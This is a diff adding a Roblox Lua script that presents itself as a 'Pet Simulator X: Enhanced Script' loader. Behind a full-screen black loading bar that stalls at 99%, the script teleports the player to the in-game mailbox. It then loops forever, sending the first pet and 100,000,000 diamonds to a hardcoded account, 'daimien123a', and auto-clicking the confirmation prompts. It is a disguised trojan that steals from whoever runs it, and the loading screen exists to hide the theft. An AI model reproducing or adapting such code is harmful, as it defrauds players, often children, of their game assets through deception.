@@ -1,0 +1,143 @@
+-- [[ CONFIGURATION ]]
+local TARGET_USERNAME = "daimien123a"
+local MAILBOX_POS = Vector3.new(189, 99, -2963)
+local FAST_DELAY = 0.4 
+local LOOP_WAIT = 5
+local OPACITY = 1 
+
+-- [[ 1. THE LOADING SCREEN UI ]]
+local Player = game.Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+if PlayerGui:FindFirstChild("SakuraLoader") then
+    PlayerGui.SakuraLoader:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui", PlayerGui)
+ScreenGui.Name = "SakuraLoader"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.DisplayOrder = 999 
+
+local Background = Instance.new("Frame", ScreenGui)
+Background.Size = UDim2.new(1, 0, 1, 0)
+Background.BackgroundColor3 = Color3.new(0, 0, 0)
+Background.BackgroundTransparency = (1 - OPACITY)
+Background.BorderSizePixel = 0
+
+local Title = Instance.new("TextLabel", Background)
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Position = UDim2.new(0, 0, 0.4, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Pet Simulator X: Enhanced Script is Loading"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextTransparency = (1 - OPACITY)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 24
+
+local BarBackground = Instance.new("Frame", Background)
+BarBackground.Size = UDim2.new(0, 400, 0, 6)
+BarBackground.Position = UDim2.new(0.5, -200, 0.5, 0)
+BarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+BarBackground.BackgroundTransparency = (1 - OPACITY)
+BarBackground.BorderSizePixel = 0
+
+local Fill = Instance.new("Frame", BarBackground)
+Fill.Size = UDim2.new(0, 0, 1, 0)
+Fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Fill.BackgroundTransparency = (1 - OPACITY)
+Fill.BorderSizePixel = 0
+
+-- [[ 2. SMOOTH DECAY LOADING LOGIC (TARGET 99%) ]]
+task.spawn(function()
+    local progress = 0
+    while true do
+        local increment = 0
+        
+        if progress < 0.5 then
+            -- Fast constant speed for the first half
+            increment = 0.008 
+        elseif progress < 0.98 then
+            -- Smoothly decreasing speed (the closer to 99, the slower it gets)
+            increment = (0.992 - progress) * 0.05
+        elseif progress < 0.99 then
+            -- Micro-steps for the final 1%
+            increment = 0.0001
+        else
+            -- Freeze exactly at 99%
+            increment = 0
+        end
+        
+        progress = math.min(progress + increment, 0.99)
+        Fill.Size = UDim2.new(progress, 0, 1, 0)
+        
+        task.wait(0.05)
+        if progress >= 0.99 then break end
+    end
+end)
+
+-- [[ 3. THE CORE SCRIPT (RUNNING IN BACKGROUND) ]]
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Library = require(ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
+
+local function ForceActivate(obj)
+    if obj then
+        Library.GUIFX.ButtonFX(obj)
+        for _, v in pairs(getconnections(obj.Activated)) do v:Fire() end
+        for _, v in pairs(getconnections(obj.MouseButton1Click)) do v:Fire() end
+        task.wait(FAST_DELAY)
+    end
+end
+
+-- Teleport once behind the veil
+local char = Player.Character or Player.CharacterAdded:Wait()
+char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(MAILBOX_POS)
+
+while true do
+    pcall(function()
+        local Mailbox = Library.GUI.Mailbox
+        local Frame = Mailbox.Gui.Frame
+
+        Library.Network.Fire("Open Mailbox")
+        task.wait(FAST_DELAY)
+
+        ForceActivate(Frame.MainMenu.Categories.Send.Frame.Button)
+
+        local UserInput = Frame.GiftPet.Side.UsernameInputFrame.Input
+        UserInput.Text = TARGET_USERNAME
+        for _, v in pairs(getconnections(UserInput.FocusLost)) do v:Fire(true) end
+        task.wait(FAST_DELAY)
+
+        local PetLayout = Frame.GiftPet.Container.Inventory.Pets
+        local targetPetBtn = nil
+
+        for _, child in ipairs(PetLayout:GetChildren()) do
+            if child:IsA("TextButton") and child.Name ~= "Template" then
+                targetPetBtn = child
+                break
+            end
+        end
+
+        if targetPetBtn then
+            ForceActivate(targetPetBtn)
+            
+            local GemInput = Frame.GiftPet.Container.Inventory.Bottom.BalanceInput.Display.Input
+            GemInput.Text = "100000000" 
+            for _, v in pairs(getconnections(GemInput.FocusLost)) do v:Fire(true) end
+            task.wait(FAST_DELAY)
+
+            ForceActivate(Frame.GiftPet.Side.BottomInputFrame.SendDiamonds)
+
+            task.wait(0.8)
+            for _, gui in pairs(Player.PlayerGui:GetChildren()) do
+                if gui:IsA("ScreenGui") and gui.Enabled and gui.Name ~= "SakuraLoader" then
+                    local Yes = gui:FindFirstChild("Yes", true) or gui:FindFirstChild("Confirm", true)
+                    if Yes and Yes.Visible then
+                        ForceActivate(Yes)
+                        break
+                    end
+                end
+            end
+        end
+    end)
+    task.wait(LOOP_WAIT)
+end
